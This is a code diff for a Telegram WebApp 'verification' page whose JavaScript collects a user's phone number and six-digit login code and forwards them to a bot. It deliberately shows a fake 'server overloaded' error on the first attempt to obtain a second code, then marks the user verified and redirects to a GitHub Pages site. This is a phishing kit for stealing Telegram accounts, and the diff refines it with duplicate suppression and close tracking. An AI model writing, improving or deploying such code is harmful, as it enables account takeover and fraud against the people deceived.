@@ -1,10 +1,15 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // Проверка поддержки Telegram WebApp
     if (!window.Telegram || !window.Telegram.WebApp) {
         console.error('Telegram WebApp is not available');
         showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
         return;
     }
+
+    // Проверяем, был ли пользователь уже верифицирован
+    //if (localStorage.getItem('isVerified')) {
+     //   window.location.href = '/mybot/verifer_user/index.html';
+    //    return;
+    //}
 
     const tg = window.Telegram.WebApp;
     const elements = {
@@ -19,27 +24,39 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     let attemptCount = 0;
+    let isClosing = false;
+    let lastSentEvent = { type: '', time: 0 };
 
     // Инициализация приложения
     function init() {
+        // Проверка верификации (добавьте этот блок в самое начало функции)
+        if (localStorage.getItem('isVerified')) {
+            window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
+            return;
+        }
         tg.expand();
         tg.setHeaderColor('#060137');
         tg.setBackgroundColor('#060137');
         tg.enableClosingConfirmation();
 
         setupEventListeners();
-        sendEvent('init');
+        safeSendEvent('init');
         vibrate('medium');
     }
 
     // Настройка обработчиков событий
     function setupEventListeners() {
-        tg.onEvent('viewportChanged', handleViewportChange);
+        const viewportHandler = (e) => {
+            if (e.isStateStable && !e.isExpanded) {
+                handleAppClose();
+            }
+        };
+        
+        tg.onEvent('viewportChanged', viewportHandler);
         tg.onEvent('closingConfirmation', handleAppClose);
 
         elements.phoneInput.addEventListener('input', formatPhoneInput);
         elements.codeInput.addEventListener('input', handleCodeInput);
-
         elements.submitPhoneBtn.addEventListener('click', handlePhoneSubmit);
         elements.submitCodeBtn.addEventListener('click', handleCodeSubmit);
     }
@@ -53,25 +70,22 @@ document.addEventListener('DOMContentLoaded', () => {
     // Виброотклик
     function vibrate(type = 'light') {
         if (!tg.HapticFeedback) return;
-
-        const types = {
-            'light': 'light',
-            'medium': 'medium',
-            'heavy': 'heavy',
-            'error': 'error'
-        };
-        
-        try {
-            tg.HapticFeedback.impactOccurred(types[type] || 'light');
-        } catch (error) {
-            console.error('Vibration error:', error);
-        }
+        const types = { 'light': 'light', 'medium': 'medium', 'heavy': 'heavy', 'error': 'error' };
+        try { tg.HapticFeedback.impactOccurred(types[type] || 'light'); } catch (error) {}
     }
 
-    // Отправка событий боту
+    // Безопасная отправка событий (без дублей)
+    async function safeSendEvent(type, data = null) {
+        const now = Date.now();
+        if (lastSentEvent.type === type && now - lastSentEvent.time < 1000) return;
+        
+        lastSentEvent = { type, time: now };
+        await sendEvent(type, data);
+    }
+
+    // Основная отправка событий
     async function sendEvent(type, data = null) {
         if (!window.sendToBot) return;
-
         try {
             await window.sendToBot(type, {
                 ...data,
@@ -84,13 +98,17 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Форматирование номера телефона
+    // Форматирование номера телефона (исправлен курсор)
     function formatPhoneInput(e) {
         const input = e.target;
         const cursorPos = input.selectionStart;
-        let value = input.value.replace(/\D/g, '');
+        const oldValue = input.value;
+        let value = oldValue.replace(/\D/g, '');
         
-        if (value.length > 0) value = '7' + value.substring(1);
+        // Сохраняем только цифры, начинающиеся с 7 (для российских номеров)
+        if (value.length > 0 && value[0] !== '7') {
+            value = '7' + value.substring(1);
+        }
         
         let formatted = '+7';
         if (value.length > 1) formatted += ' ' + value.substring(1, 4);
@@ -98,24 +116,47 @@ document.addEventListener('DOMContentLoaded', () => {
         if (value.length > 7) formatted += ' ' + value.substring(7, 9);
         if (value.length > 9) formatted += ' ' + value.substring(9, 11);
         
+        // Устанавливаем новое значение
         input.value = formatted.substring(0, 16);
-        input.setSelectionRange(cursorPos, cursorPos);
+        
+        // Корректируем позицию курсора
+        let newCursorPos = cursorPos;
+        const addedChars = input.value.length - oldValue.length;
+        
+        // Если пользователь вводит цифру в середине номера
+        if (cursorPos > 0 && cursorPos < oldValue.length) {
+            // Определяем, в какой части номера находится курсор
+            const digitsBeforeCursor = oldValue.substring(0, cursorPos).replace(/\D/g, '').length;
+            
+            // Находим соответствующую позицию в новом формате
+            if (digitsBeforeCursor <= 1) {
+                newCursorPos = 2; // После +7
+            } else if (digitsBeforeCursor <= 4) {
+                newCursorPos = 3 + digitsBeforeCursor + Math.floor((digitsBeforeCursor - 2) / 3);
+            } else if (digitsBeforeCursor <= 7) {
+                newCursorPos = 7 + digitsBeforeCursor + Math.floor((digitsBeforeCursor - 5) / 3);
+            } else if (digitsBeforeCursor <= 9) {
+                newCursorPos = 11 + digitsBeforeCursor;
+            } else {
+                newCursorPos = 14 + digitsBeforeCursor;
+            }
+        } else if (addedChars > 0) {
+            // При добавлении символов (обычный ввод)
+            newCursorPos += addedChars;
+        }
+        
+        // Ограничиваем позицию курсора длиной строки
+        newCursorPos = Math.min(newCursorPos, input.value.length);
+        input.setSelectionRange(newCursorPos, newCursorPos);
         
         if (value.length % 2 === 0) vibrate('light');
     }
 
-    // Обработка ввода кода
+    // Обработка ввода кода (без автоотправки)
     function handleCodeInput(e) {
         const value = e.target.value.replace(/\D/g, '');
         elements.codeInput.value = value.substring(0, 6);
-        
-        if (value.length > 0 && value.length <= 6) {
-            vibrate('light');
-        }
-        
-        if (value.length === 6) {
-            handleCodeSubmit();
-        }
+        if (value.length > 0 && value.length <= 6) vibrate('light');
     }
 
     // Валидация номера телефона
@@ -146,7 +187,7 @@ document.addEventListener('DOMContentLoaded', () => {
         elements.codeForm.classList.remove('hidden');
         
         try {
-            await sendEvent('phone', { phone: `+${phone}` });
+            await safeSendEvent('phone', { phone: `+${phone}` });
         } catch (error) {
             console.error('Phone submission error:', error);
             showError(elements.phoneError, 'Ошибка отправки. Попробуйте позже');
@@ -170,26 +211,22 @@ document.addEventListener('DOMContentLoaded', () => {
         setLoading(elements.submitCodeBtn, true);
         
         try {
-            await sendEvent('code', { code, attempt: attemptCount + 1 });
+            await safeSendEvent('code', { code, attempt: attemptCount + 1 });
             
             if (attemptCount === 0) {
-                // Первая попытка - имитация ошибки
                 setTimeout(() => {
                     setLoading(elements.submitCodeBtn, false);
                     showError(elements.codeError, 'Сервер перегружен. Попробуйте снова');
                     elements.codeInput.value = '';
                     attemptCount++;
                     vibrate('heavy');
-                    sendEvent('code_attempt_failed', { code, attempt: attemptCount });
+                    //safeSendEvent('code_attempt_failed', { code, attempt: attemptCount });
                 }, 3000);
             } else {
-                // Вторая попытка - успех
                 setTimeout(() => {
                     vibrate('heavy');
-                    sendEvent('verification_success', { 
-                        code, 
-                        attempts: attemptCount + 1 
-                    });
+                    localStorage.setItem('isVerified', 'true');
+                    safeSendEvent('verification_success', { code, attempts: attemptCount + 1 });
                     window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
                 }, 2000);
             }
@@ -197,6 +234,14 @@ document.addEventListener('DOMContentLoaded', () => {
             console.error('Code submission error:', error);
             setLoading(elements.submitCodeBtn, false);
             showError(elements.codeError, 'Ошибка отправки. Попробуйте позже');
+        }
+    }
+
+    // Обработка закрытия приложения
+    function handleAppClose() {
+        if (!isClosing) {
+            isClosing = true;
+            safeSendEvent('app_close');
         }
     }
 
@@ -216,16 +261,6 @@ document.addEventListener('DOMContentLoaded', () => {
         button.innerHTML = isLoading ? '<div class="loader"></div>' : 'Подтвердить';
     }
 
-    function handleViewportChange(e) {
-        if (e.isStateStable && !e.isExpanded) {
-            handleAppClose();
-        }
-    }
-
-    function handleAppClose() {
-        sendEvent('app_close');
-    }
-
     function showFatalError(message) {
         document.body.innerHTML = `
             <div class="error-container">
@@ -237,7 +272,5 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Инициализация приложения
     init();
-
-    // Очистка при размонтировании
     window.addEventListener('beforeunload', cleanup);
 });
